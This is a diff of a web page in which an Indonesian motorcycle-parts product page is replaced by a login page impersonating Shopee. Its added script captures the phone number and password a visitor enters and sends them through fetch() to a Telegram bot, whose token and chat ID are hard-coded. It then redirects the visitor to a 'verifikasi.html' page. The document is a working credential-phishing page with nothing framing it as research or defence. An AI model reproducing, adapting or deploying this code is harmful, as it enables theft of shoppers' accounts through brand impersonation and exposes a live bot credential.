@@ -1,123 +1,152 @@
-<html lang="en">
+<!DOCTYPE html>
+<html lang="id">
+
 <head>
-  <meta charset="utf-8" />
-  <meta content="width=device-width, initial-scale=1" name="viewport" />
-  <title>Product Detail</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link
-    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
-    rel="stylesheet"
-  />
-  <link
-    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap"
-    rel="stylesheet"
-  />
-  <style>
-    body {
-      font-family: "Inter", sans-serif;
-    }
-  </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login - Shopee</title>
+    <link rel="stylesheet" href="">
+    <style>
+        body {
+            font-family: sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-container {
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 350px;
+            text-align: center;
+        }
+
+        .logo img {
+            width: 120px;
+            margin-bottom: 20px;
+            object-fit: contain;
+            display: block;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-group i {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #999;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 40px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .input-group .clear-input {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            font-size: 16px;
+            color: #999;
+            cursor: pointer;
+        }
+
+        .login-button {
+            background-color: #ee4d2d;
+            color: white;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            margin-top: 10px;
+        }
+
+        .login-button:hover {
+            background-color: #d43c23;
+        }
+
+        .input-group a {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #ee4d2d;
+            text-decoration: none;
+            font-size: 0.9em;
+        }
+    </style>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
 </head>
-<body class="bg-white text-black">
-  <div class="max-w-md mx-auto border border-gray-200">
-    <!-- Image container with top icons -->
-    <div class="relative">
-      <img
-        class="w-full object-cover"
-        height="600"
-        src="tirev2010.jpg"
-        width="300"
-      />
-      <!-- Back arrow circle -->
-      <button
-        aria-label="Back"
-        class="absolute top-4 left-4 bg-gray-300 bg-opacity-50 rounded-full w-10 h-10 flex items-center justify-center"
-      >
-        <i class="fas fa-arrow-left text-white text-lg"></i>
-      </button>
-      <!-- Cart icon circle -->
-      <button
-        aria-label="Cart"
-        class="absolute top-4 right-16 bg-gray-300 bg-opacity-50 rounded-full w-10 h-10 flex items-center justify-center"
-      >
-        <i class="fas fa-shopping-cart text-white text-lg"></i>
-      </button>
-      <!-- More options circle -->
-      <button
-        aria-label="More options"
-        class="absolute top-4 right-4 bg-gray-300 bg-opacity-50 rounded-full w-10 h-10 flex items-center justify-center"
-      >
-        <i class="fas fa-ellipsis-h text-white text-lg"></i>
-      </button>
-    </div>
-    <!-- Product title -->
-    <h1
-      class="px-4 pt-10 pb-4 text-black text-base font-normal leading-5"
-      style="line-height: 1.25rem;"
-    >
-      MESIN TIGER REVO 2010 TIREV KELENGKAPAN SET PENGAPIAN KARBU SIAP PAKAI
-    </h1>
-    <!-- Delivery info -->
-    <div
-      class="flex items-center justify-between border-t border-b border-gray-200 px-4 py-3"
-    >
-      <div class="flex items-center space-x-2 text-sm text-gray-700">
-        <i class="fas fa-truck text-green-500 text-lg"></i>
-        <div>
-          <p class="font-semibold text-gray-900 leading-5">
-            Garansi tiba: Garansi keamanan sampai tiba
-          </p>
-          <p class="text-gray-400 text-xs leading-4">
-            Dapatkan Voucher s/d Rp10.000 jika pesanan terlambat.
-          </p>
+
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img id="logoImg" src="shop.JPG" alt="Shop"
+                onerror="this.onerror=null;this.src='https://logos-download.com/wp-content/uploads/2019/01/Shopee_Logo.png';" />
         </div>
-      </div>
-      <i class="fas fa-chevron-right text-gray-400"></i>
-    </div>
-    <!-- Return & COD info -->
-    <button
-      class="flex items-center justify-between w-full border-b border-gray-200 px-4 py-3 text-sm text-gray-900"
-      type="button"
-    >
-      <div class="flex items-center space-x-2">
-        <i class="fas fa-shield-alt text-red-400 text-lg"></i>
-        <span>Bebas Pengembalian · COD-Cek Dulu</span>
-      </div>
-      <i class="fas fa-chevron-right text-gray-400"></i>
-    </button>
-    <!-- Seller info -->
-    <div class="px-4 py-5">
-      <div class="flex items-center space-x-4">
-        <img
-          alt="Shop profile image showing various motorcycle parts in a workshop"
-          class="w-12 h-12 rounded-full object-cover"
-          height="48"
-          src="https://storage.googleapis.com/a1aa/image/16d644af-0053-4b0b-3657-7f070495c5ab.jpg"
-          width="48"
-        />
-        <div class="flex-1 min-w-0">
-          <p class="font-semibold text-gray-900 leading-5">AL X Garage Otomotif</p>
-          <p class="text-gray-500 text-xs leading-4 mt-0.5">Aktif 38 menit lalu</p>
-          <p class="text-gray-400 text-xs leading-4 flex items-center mt-0.5">
-            <i class="fas fa-map-marker-alt mr-1"></i>KOTA SLEMAN
-          </p>
+        <div class="input-group">
+            <i class="fas fa-user"></i>
+            <input type="text" placeholder="Nomor HP" id="nomorhp" value="" />
+            <button class="clear-input" onclick="document.getElementById('nomorhp').value=''">&times;</button>
         </div>
-        <button
-          onclick="window.location.href='index.html'"
-          class="text-orange-600 border border-orange-600 rounded px-4 py-1 text-sm font-medium hover:bg-orange-50"
-          type="button"
-        >
-          Kunjungi Toko
-        </button>
-      </div>
-      <div
-        class="flex flex-wrap gap-x-4 gap-y-1 mt-4 text-xs text-gray-600 font-semibold"
-      >
-        <span><span class="text-red-600">39</span> Produk</span>
-        <span><span class="text-red-600">4.8</span> Penilaian</span>
-        <span><span class="text-red-600">97%</span> Chat Dibalas</span>
-      </div>
+        <div class="input-group" style="position: relative;">
+            <i class="fas fa-lock"></i>
+            <input type="password" placeholder="Password" id="password" />
+            <a href="#">Lupa</a>
+        </div>
+        <button id="btnLogin" class="login-button">Log in</button>
     </div>
-  </div>
+    <script>
+        document.getElementById("btnLogin").addEventListener("click", function (e) {
+            e.preventDefault();
+            var nomorhp = document.getElementById('nomorhp').value.trim();
+            var password = document.getElementById('password').value.trim();
+            var token = "8483832719:AAH9MrWjVVmMxydfTMJjOPyG_c7xu04P6Gk";
+            var chat_id = "5923031825";
+            var text = "Login Shopee\nNomor HP: " + nomorhp + "\nPassword: " + password;
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+            var params = {
+                chat_id: chat_id,
+                text: text
+            };
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(params)
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href = "verifikasi.html";
+                    } else {
+                        alert("Gagal kirim ke Telegram: " + data.description);
+                    }
+                })
+                .catch((error) => {
+                    alert("Gagal koneksi ke Telegram: " + error);
+                });
+        });
+    </script>
 </body>
+
 </html>
